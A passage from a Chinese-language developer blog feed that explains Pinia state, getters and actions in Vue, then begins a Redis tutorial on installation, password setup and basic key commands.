<p>&#x6539;&#x53D8;&#x72B6;&#x6001;&#x9664;&#x4E86;&#x76F4;&#x63A5;&#x7528; store[attribute] &#x4FEE;&#x6539;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x8C03;&#x7528; <code>$patch()</code> &#x65B9;&#x6CD5;&#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x6216;&#x51FD;&#x6570;&#x3002;&#x524D;&#x8005;&#x9002;&#x5408;&#x4FEE;&#x6539;&#x5355;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x540E;&#x8005;&#x9002;&#x5408;&#x4FEE;&#x6539;&#x591A;&#x6761;&#x6570;&#x636E;&#x3002;&#x5EFA;&#x8BAE;&#x4F20;&#x5165;&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;&#x4F7F;&#x7528;&#x5BF9;&#x8C61;&#x4F5C;&#x53C2;&#x6570;&#x65F6;&#x4FEE;&#x6539;&#x96C6;&#x5408;&#xFF08;&#x4ECE;&#x6570;&#x7EC4;&#x4E2D;&#x63A8;&#x9001;&#x3001;&#x5220;&#x9664;&#x3001;&#x62FC;&#x63A5;&#x5143;&#x7D20;&#xFF09;&#x90FD;&#x9700;&#x8981;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x96C6;&#x5408;&#x3002;&#x82E5;&#x662F;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x5BFC;&#x81F4;&#x72B6;&#x6001;&#x7684;&#x6539;&#x53D8;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; actions&#x3002;</p>
<pre><code class="language-javascript">// &#x4F20;&#x5165;&#x5BF9;&#x8C61; &#x6539;&#x53D8; state
store.$patch({ arr: [..., itemNew], ... })
</code></pre>
<pre><code class="language-javascript">// &#x4F20;&#x5165;&#x51FD;&#x6570; &#x6539;&#x53D8; state
xxxstore.$patch((state) =&gt; {
  state.items.push({ name: &apos;shoes&apos;, quantity: 1 });
  state.helloWorld = state.helloWorld === &quot;HelloPinia&quot; ? &quot;HelloWorld&quot; : &quot;HelloPinia&quot;;
});
</code></pre>
<pre><code class="language-javascript">// actions &#x6539;&#x53D8; state
actions: {
  changeState() {
    this.count++,
    (this.helloPinia = this.helloPinia === &quot;helloPinia&quot; ? &quot;Hello World&quot; : &quot;helloPinia&quot;);
  }, ...
},
</code></pre>
<p>&#x6CE8;&#x610F;&#x5728;&#x4F7F;&#x7528; actions &#x65F6;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x7ED1;&#x5B9A;&#x662F;&#x5916;&#x90E8;&#x7684; this&#x3002;</p>
<p>&#x82E5;&#x6709;&#x66FF;&#x6362; store &#x6574;&#x4E2A;&#x72B6;&#x6001;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06; store.$state &#x5C5E;&#x6027;&#x76F4;&#x63A5;&#x8BBE;&#x7F6E;&#x4E3A;&#x65B0;&#x5BF9;&#x8C61;&#xFF0C;&#x6216;&#x901A;&#x8FC7;&#x66F4;&#x6539; pinia &#x5B9E;&#x4F8B;&#x7684; state &#x6765;&#x66FF;&#x6362;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x6574;&#x4E2A;&#x72B6;&#x6001;&#xFF0C;&#x540E;&#x8005;&#x5728; <a href="https://pinia.web3doc.top/ssr/#state-hydration">SSR</a> &#x671F;&#x95F4;&#x4F7F;&#x7528;&#x3002;</p>
<pre><code class="language-javascript">store.$state = { counter: 666, name: &apos;Paimon&apos; }
</code></pre>
<pre><code class="language-javascript">import { createPinia } from &apos;pinia&apos;
const pinia = createPinia()
pinia.state.value = {}
</code></pre>
<p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7; store &#x7684; <a href="https://pinia.web3doc.top/core-concepts/state.html#%E8%AE%A2%E9%98%85%E7%8A%B6%E6%80%81">$subscribe()</a> &#x65B9;&#x6CD5;&#x67E5;&#x770B;&#x72B6;&#x6001;&#x53CA;&#x5176;&#x53D8;&#x5316;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E; Vuex &#x7684; subscribe &#x65B9;&#x6CD5;&#x3002;&#x4E0E;&#x5E38;&#x89C4;&#x7684; watch() &#x76F8;&#x6BD4;&#xFF0C;subscriptions &#x53EA;&#x4F1A;&#x5728; patches &#x4E4B;&#x540E;&#x89E6;&#x53D1;&#x4E00;&#x6B21;&#x3002;</p>
<h3 id="getters-%E6%8E%A5%E6%94%B6%E5%99%A8">Getters &#x63A5;&#x6536;&#x5668;</h3>
<p>Getter &#x7528;&#x6CD5;&#x7C7B;&#x4F3C;&#x4E8E; Vue &#x7684;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#xFF0C;&#x901A;&#x5E38;&#x5728;&#x83B7;&#x53D6; State &#x503C;&#x65F6;&#x8FDB;&#x884C;&#x76F8;&#x5E94;&#x7684;&#x5904;&#x7406;&#x3002;&#x53EF;&#x4EE5;&#x7528; defineStore() &#x4E2D;&#x7684; getters &#x5C5E;&#x6027;&#x5B9A;&#x4E49;&#x3002;&#x53EF;&#x63A5;&#x6536;&#x72B6;&#x6001; state &#x4F5C;&#x4E3A;&#x9996;&#x4E2A;&#x53C2;&#x6570;&#x3002;</p>
<pre><code class="language-javascript">export const useStore = defineStore(&quot;main&quot;, {
  state: () =&gt; {
    return {
      ...,
      phone: &quot;12345678910&quot;,
    };
  },
  getters: {
    /* &#x624B;&#x673A;&#x4E2D;&#x95F4;&#x56DB;&#x4F4D;&#x9690;&#x85CF; */
    // &#x4F20;&#x5165;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x63A8;&#x5012;&#x51FA;&#x7ED3;&#x679C; =&gt; &#x5199;&#x6CD5;&#x4E00; =&gt; &#x4E0D;&#x4F7F;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;
    // handleHiddenPhone(state) {
    //   // getters &#x5177;&#x6709;&#x7F13;&#x5B58;&#x6027;
    //   console.log(&quot;getters&quot;);
    //   return state.phone
    //     .toString()
    //     .replace(/^(\d{3})\d{4}(\d{4})$/, &quot;$1****$2&quot;);
    // },
    // &#x5199;&#x6CD5;&#x4E8C; =&gt; &#x4F7F;&#x7528; this =&gt; &#x5B9A;&#x4E49;&#x5E38;&#x89C4;&#x51FD;&#x6570;&#x65F6;
    // handleHiddenPhone(): string {
    //   // getters &#x5177;&#x6709;&#x7F13;&#x5B58;&#x6027;
    //   console.log(&quot;getters&quot;);
    //   return this.phone.toString().replace(/^(\d{3})\d{4}(\d{4})$/, &quot;$1****$2&quot;);
    // },
    // &#x5199;&#x6CD5;&#x4E09; =&gt; &#x63A5;&#x6536;&#x72B6;&#x6001;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570; -&gt; &#x4F7F;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;
    handleHiddenPhone:(state) =&gt; state.phone.toString().replace(/^(\d{3})\d{4}(\d{4})$/, &quot;$1****$2&quot;),
  },
});
</code></pre>
<p>getters &#x6709;&#x7F13;&#x5B58;&#x6027;&#xFF0C;&#x867D;&#x88AB;&#x591A;&#x6B21;&#x8C03;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x503C;&#x4E0D;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#x53EA;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x3002;&#x5728; getters &#x91CC;&#x53EF;&#x4EE5;&#x7528; this &#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x9879;&#x76EE;&#x82E5;&#x4F7F;&#x7528; TS&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x56E0;&#x4E3A;&#x4E0D;&#x4F20; state &#x5BFC;&#x81F4; TS &#x65E0;&#x6CD5;&#x81EA;&#x52A8;&#x63A8;&#x65AD;&#x51FA;&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x663E;&#x793A;&#x6807;&#x8BB0;&#x8FD4;&#x56DE;&#x7684;&#x7C7B;&#x578B;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x3002;</p>
<p>getters &#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x88AB;&#x4F20;&#x9012;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x3002;&#x4F46;&#x53EF;&#x4EE5;&#x4ECE; getters &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x4EE5;&#x63A5;&#x53D7;&#x6240;&#x9700;&#x7684;&#x53C2;&#x6570;&#x3002;&#x5728;&#x6267;&#x884C;&#x6B64;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;getters &#x4E0D;&#x518D;&#x7F13;&#x5B58;&#xFF0C;&#x53EA;&#x662F;&#x8C03;&#x7528;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-javascript">import { defineStore } from &quot;pinia&quot;;
import { jsokStore } from &quot;./jsok&quot;;
export const useStore = defineStore(&quot;main&quot;, {
  state: () =&gt; {
    return {
      ...,
      users: [ { name: &quot;gz&quot;, id: 1, }, { name: &quot;hz&quot;, id:2 } ],
    };
  },
  getters: {
    ...
    getUserById: (state) =&gt; {
      return (userId:number) =&gt; state.users.find((user) =&gt; user.id === userId);
    },
  },
  actions: {},
});
</code></pre>
<pre><code class="language-html">&lt;template&gt;
  ...
  &lt;div&gt;user 1 =&gt; {{getUserById(1)}}&lt;/div&gt;
&lt;/template&gt;
&lt;script lang=&quot;ts&quot;&gt;
import { reactive,... } from &apos;vue&apos;
import { useStore } from &apos;../store/index&apos;
import { storeToRefs } from &apos;pinia&apos;
export default {
  name: &apos;&apos;,
  setup() {
    const store = useStore();
    const {..., getUserById} = storeToRefs(store);
    return {
      ...toRefs(data),
      store,
      ...,getUserById
    }
  },
}
&lt;/script&gt;
&lt;style scoped lang=&apos;less&apos;&gt;&lt;/style&gt;
</code></pre>
<h3 id="actions-%E6%93%8D%E4%BD%9C">Actions &#x64CD;&#x4F5C;</h3>
<p>Actions &#x76F8;&#x5F53;&#x4E8E;&#x7EC4;&#x4EF6;&#x4E2D;&#x7684; methods&#xFF0C;&#x9002;&#x5408;&#x64CD;&#x4F5C;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; defineStore() &#x4E2D;&#x7684; actions &#x5C5E;&#x6027;&#x5B9A;&#x4E49;&#x3002;</p>
<p>&#x548C; getters &#x4E00;&#x6837;&#xFF0C;actions &#x4E5F;&#x80FD;&#x901A;&#x8FC7; this &#x8BBF;&#x95EE; store &#x5B9E;&#x4F8B;&#x3002;&#x9664;&#x4E86;&#x652F;&#x6301;&#x5F02;&#x6B65;&#x64CD;&#x4F5C;&#xFF0C;&#x8C03;&#x7528; actions &#x65F6;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x63A8;&#x65AD;&#x3002;</p>
<pre><code class="language-javascript">import { defineStore } from &quot;pinia&quot;;
export const useStore = defineStore(&quot;main&quot;, {
  state: () =&gt; {
    return { helloPinia: &quot;helloPinia&quot;, ... };
  },
  getters: {...},
  actions: {
    changeState() { this.helloPinia = this.helloPinia === &quot;helloPinia&quot; ? &quot;Hello World&quot; : &quot;helloPinia&quot;; },
  },
});
</code></pre>
<p>xxStore.$onAction() &#x65B9;&#x6CD5;&#x53EF;&#x4EE5;<a href="https://pinia.web3doc.top/core-concepts/actions.html#%E8%AE%A2%E9%98%85-actions">&#x8BA2;&#x9605; actions &#x53CA;&#x5176;&#x7ED3;&#x679C;</a>&#x3002;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x56DE;&#x8C03;&#x5728; actions &#x4E4B;&#x524D;&#x6267;&#x884C;&#xFF0C;&#x5176;&#x4E2D; after() &#x662F;&#x5728; actions &#x5B8C;&#x6210;&#x540E;&#x5904;&#x7406; Promise &#x7684;&#x6267;&#x884C;&#x51FD;&#x6570;&#xFF1B;onError() &#x5728;&#x5904;&#x7406;&#x4E2D;&#x629B;&#x51FA;&#x9519;&#x8BEF;&#x3002;</p>
<pre><code class="language-javascript">// useMain.ts
import { defineStore } from &quot;pinia&quot;;
const useMainStore = defineStore(&quot;useMainUniqueId&quot;, {
  state: () =&gt; ({
    user: { name: &quot;zs&quot;, age: 23, },
  }),
  actions: {
    subscribeAction(name: string, age: number, manualError?: boolean) {
      return new Promise((resolve, reject) =&gt; {
        console.log(&quot;subscribeAction Function Performs&quot;);
        if (manualError) {
          reject(&quot;manualError !&quot;);
        } else {
          this.user.name = name;
          this.user.age = age;
          resolve(`${this.user.name} =&gt; ${this.user.age}`);
        }
      });
    }
  },
});
export default useMainStore;
</code></pre>
<pre><code class="language-html">&lt;!-- UseMain.vue --&gt;
&lt;template&gt;
  &lt;div&gt;
    &lt;button @click=&quot;subscribeNormal&quot;&gt;click me show $onAction Ok&lt;/button&gt;
    &lt;button @click=&quot;subscribeError&quot;&gt;click me show $onAction Error&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;
&lt;script lang=&quot;ts&quot;&gt;
import useMainStore from &quot;../store/useMain&quot;;
import { ref, defineComponent, computed } from &quot;vue&quot;;
export default defineComponent({
  setup() {
    const useMainUniqueId = useMainStore();
    function subscribeNormal() { useMainUniqueId.subscribeAction(useMainUniqueId.user.name, useMainUniqueId.user.age, false); }
    function subscribeError() { useMainUniqueId.subscribeAction(&quot;ErrorError&quot;, 97, true); }
    const unsubscribe = useMainUniqueId.$onAction(
      ({
        name, // action &#x51FD;&#x6570;&#x7684;&#x540D;&#x79F0;
        store, // store &#x5B9E;&#x4F8B; =&gt; useMainUniqueId
        args, // action &#x51FD;&#x6570;&#x53C2;&#x6570;&#x6570;&#x7EC4;
        after, // &#x94A9;&#x5B50;&#x51FD;&#x6570; =&gt; &#x5728; action &#x51FD;&#x6570;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x8FD4;&#x56DE;&#x6216;&#x8005; resolves &#x540E;&#x6267;&#x884C;
        onError, // &#x94A9;&#x5B50;&#x51FD;&#x6570; =&gt; &#x5728; action &#x51FD;&#x6570;&#x62A5;&#x9519;&#x6216;&#x8005; rejects &#x540E;&#x6267;&#x884C;
      }) =&gt; {
        console.log(&quot;action func name =&gt; &quot;, name);
        console.log(&quot;args array =&gt; &quot;, args);
        console.log(&quot;store instance =&gt; &quot;, store);
        after((result) =&gt; { console.log(&quot;$onAction after func =&gt; &quot;, result); });
        onError((error) =&gt; { console.log(&quot;Error Catch =&gt; &quot;, error); });
      },
      false // &#x5378;&#x8F7D;&#x7EC4;&#x4EF6;&#x540E;&#x4E0D;&#x4FDD;&#x7559;
    );
    return { subscribeNormal, subscribeError, };
  },
});
&lt;/script&gt;
&lt;style scoped lang=&quot;less&quot;&gt;&lt;/style&gt;
</code></pre>
<h3 id="bugs-%E8%A7%A3%E5%86%B3">Bugs &#x89E3;&#x51B3;</h3>
<ul>
<li>xxxStore.&lt;function&gt; is not a function =&gt; &#x6807;&#x8BC6;&#x51B2;&#x7A81;&#x65F6;&#x4EA7;&#x751F;</li>
</ul>
<p>&#x663E;&#x793A;&#x4E0D;&#x51FA;&#x7EC4;&#x4EF6;&#x7684;&#x60C5;&#x51B5; =&gt; defineStore() &#x8981;&#x6C42;&#x9996;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x4E0D;&#x91CD;&#x590D;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528; <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh">CC BY-SA 4.0 &#x534F;&#x8BAE;</a>&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Redis]]></title><description><![CDATA[redis => 6379]]></description><link>yourdomain.com/redis/</link><guid isPermaLink="false">6159ea764716ef1a9649e488</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Wed, 29 Sep 2021 13:20:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/06/redisbyzs.png" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<img src="yourdomain.com/content/images/2022/06/redisbyzs.png" alt="Redis"><p>NoSQL Not Only SQL &#x6CDB;&#x6307;&#x975E;&#x5173;&#x7CFB;&#x578B;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4EE5; Key-Value &#x5B58;&#x50A8;&#x3002;Redis &#x662F;&#x4E00;&#x6B3E;&#x5F00;&#x6E90;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#xFF0C;&#x53EF;&#x7528;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x3001;&#x7F13;&#x5B58;&#x548C;&#x6D88;&#x606F;&#x4E2D;&#x95F4;&#x4EF6;&#x3002;&#x5176;&#x9ED8;&#x8BA4;&#x5177;&#x6709; 16 &#x4E2A;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53EF;&#x4F7F;&#x7528; select [index] &#x8FDB;&#x884C;&#x5207;&#x6362;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x6570;&#x636E;&#x5E93;</th>
<th style="text-align:center">&#x529F;&#x80FD;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Memcache</td>
<td style="text-align:center">NoSql &#x6570;&#x636E;&#x5E93;&#xFF1B;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#xFF1B; &#x53EA;&#x652F;&#x6301;&#x5355;&#x4E00;&#x7C7B;&#x578B;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x6301;&#x4E45;&#x5316;&#xFF0C;&#x4E14;&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x4E0E;&#x9501;&#x7684;&#x65B9;&#x5F0F;</td>
</tr>
<tr>
<td style="text-align:center">Redis</td>
<td style="text-align:center">NoSql &#x6570;&#x636E;&#x5E93;&#xFF1B;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#xFF1B; &#x51E0;&#x4E4E;&#x8986;&#x76D6;&#x4E86; Memcached &#x7684;&#x7EDD;&#x5927;&#x90E8;&#x5206;&#x529F;&#x80FD;&#xFF1B; &#x652F;&#x6301; key-value&#x3001;&#x6301;&#x4E45;&#x5316;&#xFF1B;&#x652F;&#x6301;&#x591A;&#x79CD;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF1B; &#x4E00;&#x822C;&#x4F5C;&#x4E3A;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x5E93;&#x8F85;&#x52A9;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6570;&#x636E;&#x5E93;</td>
</tr>
<tr>
<td style="text-align:center">MongoDB</td>
<td style="text-align:center">&#x6587;&#x6863;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF1B; &#x6570;&#x636E;&#x5B58;&#x5728;&#x5185;&#x5B58;&#xFF0C;&#x82E5;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#xFF0C;&#x5C06;&#x975E;&#x70ED;&#x70B9;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x4E8E;&#x786C;&#x76D8;&#xFF1B; key-value&#x6A21;&#x5F0F;&#xFF1B;&#x67E5;&#x8BE2;&#x529F;&#x80FD;&#x4E30;&#x5BCC;&#xFF1B;&#x652F;&#x6301;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x53CA;&#x5927;&#x578B;&#x5BF9;&#x8C61;&#xFF1B; &#x53EF;&#x66FF;&#x4EE3; RDBMS &#x6210;&#x4E3A;&#x72EC;&#x7ACB;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6216;&#x914D;&#x5408; RDBMS &#x5B58;&#x50A8;&#x7279;&#x5B9A;&#x7684;&#x6570;&#x636E;</td>
</tr>
</tbody>
</table>
<p>Redis &#x4F7F;&#x7528;&#x5355;&#x7EBF;&#x7A0B;&#x4E0E;&#x591A;&#x8DEF; IO &#x590D;&#x7528;&#x6280;&#x672F;&#x3002;&#x591A;&#x8DEF; IO &#x590D;&#x7528;&#x662F;&#x6307;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x5C31;&#x7EEA;&#x72B6;&#x6001;&#x3002;&#x5C31;&#x7EEA;&#x5219;&#x8FD4;&#x56DE;&#xFF0C;&#x5426;&#x5219;&#x963B;&#x585E;&#x76F4;&#x5230;&#x8D85;&#x65F6;&#x3002;&#x5F97;&#x5230;&#x5C31;&#x7EEA;&#x72B6;&#x6001;&#x540E;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x53EF;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x91CC;&#x6267;&#x884C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#x7EBF;&#x7A0B;&#x6267;&#x884C;&#x3002;</p>
<h3 id="%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE">&#x5B89;&#x88C5;&#x914D;&#x7F6E;</h3>
<ul>
<li>Mac &#x73AF;&#x5883;</li>
</ul>
<pre><code class="language-shell"># brew&#x5B89;&#x88C5;
$ brew install redis
# &#x542F;&#x52A8;|&#x5173;&#x95ED;|&#x91CD;&#x542F; redis &#x670D;&#x52A1;
$ brew services start|stop|restart redis
# &#x6253;&#x5F00;&#x56FE;&#x5F62;&#x5316;&#x754C;&#x9762;
$ redis-cli
# &#x67E5;&#x770B;&#x7248;&#x672C;&#x4FE1;&#x606F;
127.0.0.1:6379&gt; info
# &#x5F00;&#x673A;&#x542F;&#x52A8; redis
$ ln -sfv /usr/local/opt/redis/*.plist ~/Library/LaunchAgents
# &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x542F;&#x52A8; redis-server
redis-server /usr/local/etc/redis.conf
# &#x505C;&#x6B62;redis&#x670D;&#x52A1;
redis-cli shutdown
# redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;
/usr/local/etc/redis.conf
# &#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;
# &#x6CE8;&#x91CA; bind. &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B; redis &#x4E0D;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x53EA;&#x5141;&#x8BB8;&#x672C;&#x673A;
$ vim /usr/local/etc/redis.conf
# redis3.2 &#x540E;&#x589E;&#x52A0; protected-mode, &#x9700;&#x628A; protected-mode yes &#x6539;&#x4E3A; protected-mode no
</code></pre>
<ul>
<li>CentOS &#x73AF;&#x5883;</li>
</ul>
<pre><code class="language-shell"># &#x8981;&#x6C42; C &#x8BED;&#x8A00;&#x7F16;&#x8BD1;&#x73AF;&#x5883;
$ gcc --version
gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44)
# &#x5728; /opt &#x4E0B;&#x8F7D;&#x5E76;&#x89E3;&#x538B;&#x5B89;&#x88C5;&#x5305;
$ wget http://download.redis.io/releases/redis-7.0.2.tar.gz
$ tar -xzf redis-7.0.2.tar.gz
# Redis &#x76EE;&#x5F55;&#x4E0B;&#x6267;&#x884C;&#x7F16;&#x8BD1;&#x4E0E;&#x5B89;&#x88C5;
$ make
$ make install
# &#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x76EE;&#x5F55; /usr/local/bin
$ cd /usr/local/bin &amp;&amp; ls
redis-check-aof =&gt; &#x4FEE;&#x590D;&#x6709;&#x95EE;&#x9898;&#x7684; AOF &#x6587;&#x4EF6;
redis-cli =&gt; &#x5BA2;&#x6237;&#x7AEF;
redis-server =&gt; redis &#x670D;&#x52A1;&#x5668;&#x542F;&#x52A8;&#x547D;&#x4EE4;
redis-benchmark =&gt; &#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;
redis-check-rdb =&gt; &#x68C0;&#x67E5;&#x8F6C;&#x50A8;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x5B8C;&#x6574;&#x6027;
redis-sentinel =&gt; &#x96C6;&#x7FA4;&#x4F7F;&#x7528;&#x63D0;&#x4F9B;&#x5BF9;&#x6240;&#x6709; Redis &#x8282;&#x70B9;&#x7684;&#x76D1;&#x63A7;&#x5E76;&#x5728;&#x4E3B;&#x8282;&#x70B9;&#x4E0D;&#x53EF;&#x7528;&#x65F6;&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#x6545;&#x969C;&#x8F6C;&#x79FB;
# redis &#x542F;&#x52A8; =&gt; &#x4E0D;&#x63A8;&#x8350;&#x524D;&#x53F0;&#x542F;&#x52A8;
$ cd /opt/redis-7.0.2/
# &#x590D;&#x5236;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x66F4;&#x6539;&#x914D;&#x7F6E;
$ cp redis.conf /etc/redis.conf
$ cd /etc
# &#x8BBE;&#x7F6E; daemonize no &#x6539;&#x4E3A; yes =&gt; &#x641C;&#x7D22;&#x6A21;&#x5F0F; / =&gt; 309
$ vim redis.conf
# &#x540E;&#x7EED;&#x64CD;&#x4F5C;&#x53EA;&#x9700;&#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x5373;&#x53EF;
$ cd /usr/local/bin
$ redis-server /etc/redis.conf
$ ps -ef | grep redis
root     10261     1  0 13:55 ?        00:00:00 redis-server 127.0.0.1:6379
root     10311  5616  0 13:55 pts/0    00:00:00 grep --color=auto redis
$ redis-cli
127.0.0.1:6379&gt; ping
PONG
# &#x5173;&#x95ED; redis
127.0.0.1:6379&gt; exit
kill -9 10261
</code></pre>
<ul>
<li>Mac &#x8BBE;&#x7F6E; Redis &#x7684;&#x5BC6;&#x7801;</li>
</ul>
<pre><code class="language-shell"># &#x65B9;&#x5F0F;&#x4E00;
$ redis-cli
127.0.0.1:6379&gt; config get requirepass
1) &quot;requirepass&quot;
2) &quot;&quot;
127.0.0.1:6379&gt; config set requirepass &quot;&lt;password&gt;&quot;
OK
127.0.0.1:6379&gt; config get requirepass
(error) NOAUTH Authentication required.
127.0.0.1:6379&gt; auth &lt;password&gt;
OK
127.0.0.1:6379&gt; config get requirepass
1) &quot;requirepass&quot;
2) &quot;&lt;password&gt;&quot;
# &#x65B9;&#x5F0F;&#x4E8C;
$ vim /usr/local/etc/redis.conf
# 898 # The requirepass is not compatable with aclfile option and the ACL LOAD
# 899 # command, these will cause requirepass to be ignored.
# 900 #
# 901 # requirepass foobared =&gt; &#x4FEE;&#x6539;&#x6389; foobared &#x5E76;&#x89E3;&#x9664;&#x6CE8;&#x91CA;
$ brew services restart redis
# &#x91CD;&#x542F;&#x540E;&#x4E0D;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x53EF;&#x8FDB;&#x884C; redis-cli &#x4F46;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;
$ redis-cli -h 127.0.0.1 -p 6379 -a &lt;password&gt;
# &#x8F93;&#x5165;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x72B6;&#x6001;
127.0.0.1:6379&gt; CONFIG get REQUIREPASS
1) &quot;REQUIREPASS&quot;
2) &quot;&lt;password&gt;&quot;
# &#x4E0D;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x72B6;&#x6001;
127.0.0.1:6379&gt; CONFIG GET REQUIREPASS
(error) NOAUTH Authentication required.
</code></pre>
<h3 id="%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">&#x6570;&#x636E;&#x7C7B;&#x578B;</h3>
<p>redis &#x5E38;&#x7528;&#x7684;&#x4E94;&#x5927;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E3A; String&#x3001;List&#x3001;Set&#x3001;Hash&#x3001;Zset&#x3002;</p>
<ul>
<li>Key &#x952E;</li>
</ul>
<pre><code class="language-shell">$ /usr/local/bin/redis-cli
# &#x8BBE;&#x7F6E; key &#x503C;&#x4E0E; value
127.0.0.1:6379&gt; set k1 zs # set k2 gz set k3 jr
# &#x67E5;&#x770B;&#x5F53;&#x524D;&#x5E93;&#x6240;&#x6709; key
127.0.0.1:6379&gt; keys *
1) &quot;k3&quot;
2) &quot;k2&quot;
